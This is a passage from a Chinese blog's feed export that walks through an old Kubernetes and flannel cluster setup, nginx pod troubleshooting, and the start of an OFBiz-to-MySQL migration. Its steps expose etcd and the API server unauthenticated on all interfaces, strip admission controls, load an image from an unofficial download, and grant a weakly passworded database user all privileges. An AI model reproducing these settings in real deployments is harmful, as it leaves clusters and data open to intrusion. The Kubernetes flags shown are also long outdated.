class="attr">ETCD_NAME</span>=default</span><br><span class="line"><span class="attr">ETCD_DATA_DIR</span>=<span class="string">&quot;/var/lib/etcd/default.etcd&quot;</span></span><br><span class="line"><span class="attr">ETCD_LISTEN_CLIENT_URLS</span>=<span class="string">&quot;&lt;span style=&quot;</span>color: <span class="comment">#ff0000;&quot;&gt;http://0.0.0.0:2379&lt;/span&gt;&quot;</span></span><br><span class="line"><span class="comment">#[cluster]</span></span><br><span class="line"><span class="attr">ETCD_ADVERTISE_CLIENT_URLS</span>=<span class="string">&quot;http://localhost:2379&quot;</span></span><br></pre></td></tr></table></figure><h3 id="3-编辑Kubernetes-API-server的配置文件"><a href="#3-编辑Kubernetes-API-server的配置文件" class="headerlink" title="3. 编辑Kubernetes API server的配置文件"></a>3. 编辑Kubernetes API server的配置文件</h3><p>确保下列行没有被注释，并为下列的值</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/kubernetes/apiserver</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment"># kubernetes system config</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The following values are used to configure the kube-apiserver</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The address on the local server to listen to.</span></span><br><span class="line"><span class="attr">KUBE_API_ADDRESS</span>=<span class="string">&quot;--address=0.0.0.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The port on the local server to listen on.</span></span><br><span class="line"><span class="attr">KUBE_API_PORT</span>=<span class="string">&quot;--port=8080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Port minions listen on</span></span><br><span class="line"><span class="attr">KUBELET_PORT</span>=<span class="string">&quot;--kubelet_port=10250&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Comma separated list of nodes in the etcd cluster</span></span><br><span class="line"><span class="attr">KUBE_ETCD_SERVERS</span>=<span class="string">&quot;--etcd_servers=http://127.0.0.1:2379&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Address range to use for services</span></span><br><span class="line"><span class="attr">KUBE_SERVICE_ADDRESSES</span>=<span class="string">&quot;--service-cluster-ip-range=10.254.0.0/16&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># default admission control policies</span></span><br><span class="line"><span class="attr">KUBE_ADMISSION_CONTROL</span>=<span class="string">&quot;--admission_control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add your own!</span></span><br><span class="line"><span class="attr">KUBE_API_ARGS</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="4-启动etcd-kube-apiserver-kube-controller-manager-和-kube-scheduler服务，并设置开机自启"><a href="#4-启动etcd-kube-apiserver-kube-controller-manager-和-kube-scheduler服务，并设置开机自启" class="headerlink" title="4. 启动etcd, kube-apiserver, kube-controller-manager 和 kube-scheduler服务，并设置开机自启"></a>4. 启动etcd, kube-apiserver, kube-controller-manager 和 kube-scheduler服务，并设置开机自启</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for SERVICES in etcd kube-apiserver kube-controller-manager kube-scheduler; do </span></span><br><span class="line">    systemctl restart <span class="variable">$SERVICES</span></span><br><span class="line">    systemctl <span class="built_in">enable</span> <span class="variable">$SERVICES</span></span><br><span class="line">    systemctl status <span class="variable">$SERVICES</span> </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="5-在etcd中定义flannel-network的配置，这些配置会被flannel-service下发到minions"><a href="#5-在etcd中定义flannel-network的配置，这些配置会被flannel-service下发到minions" class="headerlink" title="5. 在etcd中定义flannel network的配置，这些配置会被flannel service下发到minions:"></a>5. 在etcd中定义flannel network的配置，这些配置会被flannel service下发到minions:</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># etcdctl mk <span class="regexp">/coreos.com/</span>network<span class="regexp">/config &#x27;&#123;&quot;Network&quot;:&quot;172.17.0.0/</span><span class="number">16</span><span class="string">&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="6-添加iptables规则，允许相应的端口"><a href="#6-添加iptables规则，允许相应的端口" class="headerlink" title="6. 添加iptables规则，允许相应的端口"></a>6. 添加iptables规则，允许相应的端口</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">iptables -<span class="selector-tag">I</span> <span class="selector-tag">INPUT</span> -<span class="selector-tag">p</span> tcp --dport <span class="number">2379</span> -j ACCEPT</span><br><span class="line">iptables -<span class="selector-tag">I</span> <span class="selector-tag">INPUT</span> -<span class="selector-tag">p</span> tcp --dport <span class="number">10250</span> -j ACCEPT</span><br><span class="line">iptables -<span class="selector-tag">I</span> <span class="selector-tag">INPUT</span> -<span class="selector-tag">p</span> tcp --dport <span class="number">8080</span> -j ACCEPT</span><br><span class="line">iptables-save</span><br></pre></td></tr></table></figure><h3 id="7-查看节点信息（我们还没有配置节点信息，所以这里应该为空）"><a href="#7-查看节点信息（我们还没有配置节点信息，所以这里应该为空）" class="headerlink" title="7. 查看节点信息（我们还没有配置节点信息，所以这里应该为空）"></a>7. 查看节点信息（我们还没有配置节点信息，所以这里应该为空）</h3><figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"># kubectl get nodes</span><br><span class="line"><span class="keyword">NAME</span>             LABELS              <span class="keyword">STATUS</span></span><br></pre></td></tr></table></figure><h2 id="安装Kubernetes-Minions-Nodes"><a href="#安装Kubernetes-Minions-Nodes" class="headerlink" title="安装Kubernetes Minions (Nodes)"></a>安装<strong>Kubernetes Minions (Nodes)</strong></h2></h2><p><em>注：下面这些步骤应该在minion1和minions2上执行（也可以添加更多的minions）</em></p><h3 id="1-使用yum安装kubernetes-和-flannel"><a href="#1-使用yum安装kubernetes-和-flannel" class="headerlink" title="1. 使用yum安装kubernetes 和 flannel"></a>1. 使用yum安装kubernetes 和 flannel</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install -y flannel kubernetes</span></span><br></pre></td></tr></table></figure><h3 id="2-为flannel-service配置etcd服务器"><a href="#2-为flannel-service配置etcd服务器" class="headerlink" title="2. 为flannel service配置etcd服务器"></a>2. 为flannel service配置etcd服务器</h3><p>编辑/etc/sysconfig/flanneld文件中的下列行以连接到master</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/sysconfig/flanneld</span></span><br><span class="line"></span><br><span class="line"><span class="attr">FLANNEL_ETCD</span>=<span class="string">&quot;http://192.168.0.79:2379&quot;</span>        <span class="comment">#改为etcd服务器的ip</span></span><br></pre></td></tr></table></figure><h3 id="3-编辑-kubernetes-配置文件"><a href="#3-编辑-kubernetes-配置文件" class="headerlink" title="3. 编辑 kubernetes 配置文件"></a>3. 编辑 kubernetes 配置文件</h3><p>编辑/etc/kubernetes/config中kubernetes的默认配置，确保KUBE_MASTER的值是连接到Kubernetes master API server：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/kubernetes/config</span></span><br><span class="line"><span class="attr">KUBE_MASTER</span>=<span class="string">&quot;--master=http://192.168.0.79:8080&quot;</span></span><br></pre></td></tr></table></figure><h3 id="4-编辑-etc-kubernetes-kubelet-如下行："><a href="#4-编辑-etc-kubernetes-kubelet-如下行：" class="headerlink" title="4. 编辑/etc/kubernetes/kubelet 如下行："></a>4. 编辑/etc/kubernetes/kubelet 如下行：</h3><p>minion1:</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/kubernetes/kubelet</span></span><br><span class="line"></span><br><span class="line"><span class="attr">KUBELET_ADDRESS</span>=<span class="string">&quot;--address=0.0.0.0&quot;</span></span><br><span class="line"><span class="attr">KUBELET_PORT</span>=<span class="string">&quot;--port=10250&quot;</span></span><br><span class="line"><span class="attr">KUBELET_HOSTNAME</span>=<span class="string">&quot;--hostname_override=192.168.0.80&quot;</span></span><br><span class="line"><span class="attr">KUBELET_API_SERVER</span>=<span class="string">&quot;--api_servers=http://192.168.0.79:8080&quot;</span></span><br><span class="line"><span class="attr">KUBELET_ARGS</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>minion2:</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/kubernetes/kubelet</span></span><br><span class="line"></span><br><span class="line"><span class="attr">KUBELET_ADDRESS</span>=<span class="string">&quot;--address=0.0.0.0&quot;</span></span><br><span class="line"><span class="attr">KUBELET_PORT</span>=<span class="string">&quot;--port=10250&quot;</span></span><br><span class="line"><span class="attr">KUBELET_HOSTNAME</span>=<span class="string">&quot;--hostname_override=192.168.0.81&quot;</span></span><br><span class="line"><span class="attr">KUBELET_API_SERVER</span>=<span class="string">&quot;--api_servers=http://192.168.0.79:8080&quot;</span></span><br><span class="line"><span class="attr">KUBELET_ARGS</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-启动kube-proxy-kubelet-docker-和-flanneld-services服务，并设置开机自启"><a href="#5-启动kube-proxy-kubelet-docker-和-flanneld-services服务，并设置开机自启" class="headerlink" title="5. 启动kube-proxy, kubelet, docker 和 flanneld services服务，并设置开机自启"></a>5. 启动kube-proxy, kubelet, docker 和 flanneld services服务，并设置开机自启</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for SERVICES in kube-proxy kubelet docker flanneld; do </span></span><br><span class="line">    systemctl restart <span class="variable">$SERVICES</span></span><br><span class="line">    systemctl <span class="built_in">enable</span> <span class="variable">$SERVICES</span></span><br><span class="line">    systemctl status <span class="variable">$SERVICES</span> </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="6-在每个minion节点，你应当注意到你有两块新的网卡docker0-和-flannel0。你应该得到不同的ip地址范围在flannel0上，就像下面这样："><a href="#6-在每个minion节点，你应当注意到你有两块新的网卡docker0-和-flannel0。你应该得到不同的ip地址范围在flannel0上，就像下面这样：" class="headerlink" title="6. 在每个minion节点，你应当注意到你有两块新的网卡docker0 和 flannel0。你应该得到不同的ip地址范围在flannel0上，就像下面这样："></a>6. 在每个minion节点，你应当注意到你有两块新的网卡docker0 和 flannel0。你应该得到不同的ip地址范围在flannel0上，就像下面这样：</h3><p>minion1:</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip a | grep flannel | grep inet</span></span><br><span class="line">    <span class="attribute">inet</span> <span class="number">172.17.29.0</span>/<span class="number">16</span> scope global flannel<span class="number">0</span></span><br></pre></td></tr></table></figure><p>minion2:</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip a | grep flannel | grep inet</span></span><br><span class="line">    <span class="attribute">inet</span> <span class="number">172.17.37.0</span>/<span class="number">16</span> scope global flannel<span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="7-添加iptables规则："><a href="#7-添加iptables规则：" class="headerlink" title="7. 添加iptables规则："></a>7. 添加iptables规则：</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">iptables -<span class="selector-tag">I</span> <span class="selector-tag">INPUT</span> -<span class="selector-tag">p</span> tcp --dport <span class="number">2379</span> -j ACCEPT</span><br><span class="line">iptables -<span class="selector-tag">I</span> <span class="selector-tag">INPUT</span> -<span class="selector-tag">p</span> tcp --dport <span class="number">10250</span> -j ACCEPT</span><br><span class="line">iptables -<span class="selector-tag">I</span> <span class="selector-tag">INPUT</span> -<span class="selector-tag">p</span> tcp --dport <span class="number">8080</span> -j ACCEPT</span><br></pre></td></tr></table></figure><h3 id="8-现在登陆kubernetes-master节点验证minions的节点状态："><a href="#8-现在登陆kubernetes-master节点验证minions的节点状态：" class="headerlink" title="8. 现在登陆kubernetes master节点验证minions的节点状态："></a>8. 现在登陆kubernetes master节点验证minions的节点状态：</h3><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"># kubectl get nodes</span><br><span class="line">NAME           LABELS                                STATUS</span><br><span class="line"><span class="number">192.168.0.80</span>   kubernetes.io/hostname=<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">80</span>   Ready</span><br><span class="line"><span class="number">192.168.0.81</span>   kubernetes.io/hostname=<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">81</span>   Ready</span><br></pre></td></tr></table></figure><p>至此，kubernetes集群已经配置并运行了，我们可以继续下面的步骤。</p><h2 id="创建-Pods-Containers"><a href="#创建-Pods-Containers" class="headerlink" title="创建 Pods (Containers)"></a>创建 Pods (Containers)</h2><p>为了创建一个pod，我们需要在kubernetes master上面定义一个yaml 或者 json配置文件。然后使用kubectl命令创建pod</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># mkdir -p k8s/pods</span></span><br><span class="line"><span class="meta"># cd k8s/pods/</span></span><br><span class="line"><span class="meta"># vim nginx.yaml</span></span><br></pre></td></tr></table></figure><p>在nginx.yaml里面增加如下内容：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>创建pod:</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># kubectl create -f nginx.yaml</span></span><br></pre></td></tr></table></figure><p>此时有如下报错：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Error <span class="keyword">from</span> <span class="keyword">server</span>: error <span class="keyword">when</span> creating &quot;nginx.yaml&quot;: Pod &quot;nginx&quot; <span class="keyword">is</span> forbidden: <span class="keyword">no</span> API token <span class="built_in">found</span> <span class="keyword">for</span> service account <span class="keyword">default</span>/<span class="keyword">default</span>, retry <span class="keyword">after</span> the token <span class="keyword">is</span> automatically created <span class="keyword">and</span> added <span class="keyword">to</span> the service account </span><br></pre></td></tr></table></figure><p>解决办法是编辑/etc/kubernetes/apiserver 去除 KUBE_ADMISSION_CONTROL 中的 SecurityContextDeny,ServiceAccount ，并重启kube-apiserver.service服务：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/kubernetes/apiserver</span></span><br><span class="line"><span class="attr">KUBE_ADMISSION_CONTROL</span>=<span class="string">&quot;--admission_control=NamespaceLifecycle,NamespaceExists,LimitRanger,ResourceQuota&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># systemctl restart kube-apiserver.service</span></span><br></pre></td></tr></table></figure><p>之后重新创建pod:</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># kubectl create -f nginx.yaml</span></span><br><span class="line">pods/nginx</span><br></pre></td></tr></table></figure><p>查看pod:</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get pod nginx</span></span><br><span class="line"><span class="attribute">NAME</span>      READY     STATUS                                            RESTARTS   AGE</span><br><span class="line"><span class="attribute">nginx</span>     <span class="number">0</span>/<span class="number">1</span>       Image: nginx is not ready <span class="literal">on</span> the node   <span class="number">0</span>          <span class="number">34</span>s</span><br></pre></td></tr></table></figure><p>这里STATUS一直是这个，创建不成功，下面排错。通过查看pod的描述发现如下错误：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl describe pod nginx </span></span><br><span class="line"><span class="attribute">Wed</span>, <span class="number">28</span> Oct <span class="number">2015</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">30</span> +<span class="number">0800</span>       Wed, <span class="number">28</span> Oct <span class="number">2015</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">30</span> +<span class="number">0800</span> <span class="number">1</span>       &#123;kubelet <span class="number">192.168.0.81</span>&#125;  implicitly required container POD       pulled          Successfully pulled Pod container image <span class="string">&quot;gcr.io/google_containers/pause:0.8.0&quot;</span></span><br><span class="line">  <span class="attribute">Wed</span>, <span class="number">28</span> Oct <span class="number">2015</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">30</span> +<span class="number">0800</span>       Wed, <span class="number">28</span> Oct <span class="number">2015</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">30</span> +<span class="number">0800</span> <span class="number">1</span>       &#123;kubelet <span class="number">192.168.0.81</span>&#125;  implicitly required container POD       failed          Failed to create docker container with error: no such image</span><br><span class="line">  <span class="attribute">Wed</span>, <span class="number">28</span> Oct <span class="number">2015</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">30</span> +<span class="number">0800</span>       Wed, <span class="number">28</span> Oct <span class="number">2015</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">30</span> +<span class="number">0800</span> <span class="number">1</span>       &#123;kubelet <span class="number">192.168.0.81</span>&#125;                                          failedSync      Error syncing pod, skipping: no such image</span><br><span class="line">  <span class="attribute">Wed</span>, <span class="number">28</span> Oct <span class="number">2015</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">30</span> +<span class="number">0800</span>       Wed, <span class="number">28</span> Oct <span class="number">2015</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">30</span> +<span class="number">0800</span> <span class="number">2</span>       &#123;kubelet <span class="number">192.168.0.81</span>&#125;  implicitly required container POD       failed          Failed to pull image <span class="string">&quot;gcr.io/google_containers/pause:0.8.0&quot;</span>: image pull failed for gcr.io/google_containers/pause:<span class="number">0</span>.<span class="number">8</span>.<span class="number">0</span>, this may be because there are no credentials <span class="literal">on</span> this request.  details: (API error (<span class="number">500</span>): invalid registry endpoint <span class="string">&quot;http://gcr.io/v0/&quot;</span>. HTTPS attempt: unable to ping registry endpoint https://gcr.io/v<span class="number">0</span>/</span><br><span class="line"><span class="attribute">v2</span> ping attempt failed with error: Get https://gcr.io/v<span class="number">2</span>/: dial tcp <span class="number">173.194.72.82:443</span>: i/o timeout</span><br></pre></td></tr></table></figure><p>手动ping了一下gcr.io发现无法ping通（可能是被墙了）,从网上找到 pause:0.8.0 的镜像，然后再每个minion上导入镜像:</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"># docker <span class="built_in">load</span> <span class="comment">--input pause-0.8.0.tar</span></span><br></pre></td></tr></table></figure><p>附下载：<a href="/attachment/uploads/2015/10/pause-0.8.0.tar">pause-0.8.0.tar</a><br>在执行以下命令即可成功创建pod</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># kubectl create -f nginx.yaml</span></span><br><span class="line">pods/nginx</span><br></pre></td></tr></table></figure><p>查看pod</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get pod nginx</span></span><br><span class="line"><span class="attribute">NAME</span>      READY     STATUS                                            RESTARTS   AGE</span><br><span class="line"><span class="attribute">nginx</span>      <span class="number">1</span>/<span class="number">1</span>             Running                                            <span class="number">0</span>               <span class="number">2</span>min</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kubernetes </tag>
            
            <tag> linux </tag>
            
            <tag> pod </tag>
            
            <tag> service </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ofbiz 使用mysql作为存储数据库</title>
      <link href="linux/ofbiz-use-mysql.html"/>
      <url>linux/ofbiz-use-mysql.html</url>
      
        <content type="html"><![CDATA[<p>OFBiz是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。 OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。OFBiz 已经正式成为 Apache 的顶级项目: Apache OFBiz。       ofbiz自带的数据库是Derby,这是一种小型的适合于测试系统的数据库,但不适合在产品级系统中使用,所以通常我们需要将ofbiz数据库迁移到其它数据库上。下面介绍迁移到mysql的步骤，迁移到其他数据库操作类似。  </p><h3 id="1-安装mysql，创建ofbiz的数据库"><a href="#1-安装mysql，创建ofbiz的数据库" class="headerlink" title="1. 安装mysql，创建ofbiz的数据库"></a>1. 安装mysql，创建ofbiz的数据库</h3><p>使用以下命令分别创建ofbiz用户（密码ofbiz）,和ofbiz、ofbizolap、ofbiztenant三个数据库</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">mysql -u root </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;ofbiz&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;ofbiz&#x27;</span>;   </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> ofbiz <span class="keyword">DEFAULT</span> CHARSET utf8mb4 <span class="keyword">COLLATE</span> mb4_general_ci;  </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> ofbizolap <span class="keyword">DEFAULT</span> CHARSET utf8mb4 <span class="keyword">COLLATE</span> mb4_general_ci;  </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> ofbiztenant <span class="keyword">DEFAULT</span> CHARSET utf8mb4 <span class="keyword">COLLATE</span> mb4_general_ci;  </span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">&#x27;ofbiz&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">flush <span class="keyword">privileges</span>;</span><br><span class="line">quit;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2-修改ofbiz配置文件"><a href="#2-修改ofbiz配置文件" class="headerlink" title="2. 修改ofbiz配置文件"></a>2. 修改ofbiz配置文件</h3><p>编辑 entityengine.xml 修改默认的数据库引擎，以及连接数据库的用户名密码等信息  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim ofbiz_HOME/framework/entity/config/entityengine.xml</span></span><br><span class="line"></span><br><span class="line">修改其中的delegator name标签为如下内容（即注释derby启用mysql）</span><br><span class="line"></span><br><span class="line">&lt;delegator name=<span class="string">&quot;default&quot;</span> entity-model-reader=<span class="string">&quot;main&quot;</span> entity-group-reader=<span class="string">&quot;main&quot;</span> entity-eca-reader=<span class="string">&quot;main&quot;</span> distributed-cache-clear-enabled=<span class="string">&quot;false&quot;</span>&gt;</span><br><span class="line">        &lt;!-- &lt;group-map group-name=<span class="string">&quot;org.ofbiz&quot;</span> datasource-name=<span class="string">&quot;localderby&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.olap&quot;</span> datasource-name=<span class="string">&quot;localderbyolap&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.tenant&quot;</span> datasource-name=<span class="string">&quot;localderbytenant&quot;</span>/&gt; --&gt;</span><br><span class="line">&lt;group-map group-name=<span class="string">&quot;org.ofbiz&quot;</span> datasource-name=<span class="string">&quot;localmysql&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.olap&quot;</span> datasource-name=<span class="string">&quot;localmysqlolap&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.tenant&quot;</span> datasource-name=<span class="string">&quot;localmysqltenant&quot;</span>/&gt;</span><br><span class="line">        &lt;!-- &lt;group-map group-name=<span class="string">&quot;org.ofbiz&quot;</span> datasource-name=<span class="string">&quot;localpostnew&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.olap&quot;</span> datasource-name=<span class="string">&quot;localpostolap&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.tenant&quot;</span> datasource-name=<span class="string">&quot;localposttenant&quot;</span>/&gt; --&gt;</span><br><span class="line">    &lt;/delegator&gt;</span><br><span class="line">    &lt;delegator name=<span class="string">&quot;default-no-eca&quot;</span> entity-model-reader=<span class="string">&quot;main&quot;</span> entity-group-reader=<span class="string">&quot;main&quot;</span> entity-eca-reader=<span class="string">&quot;main&quot;</span> entity-eca-enabled=<span class="string">&quot;false&quot;</span> distributed-cache-clear-enabled=<span class="string">&quot;false&quot;</span>&gt;</span><br><span class="line">        &lt;!-- &lt;group-map group-name=<span class="string">&quot;org.ofbiz&quot;</span> datasource-name=<span class="string">&quot;localderby&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.olap&quot;</span> datasource-name=<span class="string">&quot;localderbyolap&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.tenant&quot;</span> datasource-name=<span class="string">&quot;localderbytenant&quot;</span>/&gt; --&gt;</span><br><span class="line">&lt;group-map group-name=<span class="string">&quot;org.ofbiz&quot;</span> datasource-name=<span class="string">&quot;localmysql&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.olap&quot;</span> datasource-name=<span class="string">&quot;localmysqlolap&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.tenant&quot;</span> datasource-name=<span class="string">&quot;localmysqltenant&quot;</span>/&gt;</span><br><span class="line">        &lt;!-- &lt;group-map group-name=<span class="string">&quot;org.ofbiz&quot;</span> datasource-name=<span class="string">&quot;localpostnew&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.olap&quot;</span> datasource-name=<span class="string">&quot;localpostolap&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.tenant&quot;</span> datasource-name=<span class="string">&quot;localposttenant&quot;</span>/&gt;  --&gt;</span><br><span class="line">    &lt;/delegator&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- be sure that your default delegator (or the one you use) uses the same datasource <span class="keyword">for</span> <span class="built_in">test</span>. You must run <span class="string">&quot;ant load-demo&quot;</span> before running <span class="string">&quot;ant run-tests&quot;</span> --&gt;</span><br><span class="line">    &lt;delegator name=<span class="string">&quot;test&quot;</span> entity-model-reader=<span class="string">&quot;main&quot;</span> entity-group-reader=<span class="string">&quot;main&quot;</span> entity-eca-reader=<span class="string">&quot;main&quot;</span>&gt;</span><br><span class="line">        &lt;!-- &lt;group-map group-name=<span class="string">&quot;org.ofbiz&quot;</span> datasource-name=<span class="string">&quot;localderby&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.olap&quot;</span> datasource-name=<span class="string">&quot;localderbyolap&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.tenant&quot;</span> datasource-name=<span class="string">&quot;localderbytenant&quot;</span>/&gt; --&gt;</span><br><span class="line">&lt;group-map group-name=<span class="string">&quot;org.ofbiz&quot;</span> datasource-name=<span class="string">&quot;localmysql&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.olap&quot;</span> datasource-name=<span class="string">&quot;localmysqlolap&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.tenant&quot;</span> datasource-name=<span class="string">&quot;localmysqltenant&quot;</span>/&gt;</span><br><span class="line">        &lt;!-- &lt;group-map group-name=<span class="string">&quot;org.ofbiz&quot;</span> datasource-name=<span class="string">&quot;localpostnew&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.olap&quot;</span> datasource-name=<span class="string">&quot;localpostolap&quot;</span>/&gt;</span><br><span class="line">        &lt;group-map group-name=<span class="string">&quot;org.ofbiz.tenant&quot;</span> datasource-name=<span class="string">&quot;localposttenant&quot;</span>/&gt;  --&gt;</span><br><span class="line">    &lt;/delegator&gt;</span><br></pre></td></tr></table></figure><p>修改datasource name部分注意修改数据库登陆信息及字符集和编码</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;datasource <span class="type">name</span>=&quot;localmysql&quot;</span><br><span class="line">        helper-<span class="keyword">class</span>=&quot;org.ofbiz.entity.datasource.GenericHelperDAO&quot;</span><br><span class="line">        field-<span class="keyword">type</span>-<span class="type">name</span>=&quot;mysql&quot;</span><br><span class="line">        <span class="keyword">check</span>-<span class="keyword">on</span>-start=&quot;true&quot;</span><br><span class="line">        <span class="keyword">add</span>-missing-<span class="keyword">on</span>-start=&quot;true&quot;</span><br><span class="line">        <span class="keyword">check</span>-pks-<span class="keyword">on</span>-start=&quot;false&quot;</span><br><span class="line">        use-<span class="keyword">foreign</span>-keys=&quot;true&quot;</span><br><span class="line">        <span class="keyword">join</span>-style=&quot;ansi-no-parenthesis&quot;</span><br><span class="line">        <span class="keyword">alias</span>-<span class="keyword">view</span>-<span class="keyword">columns</span>=&quot;false&quot;</span><br><span class="line">        <span 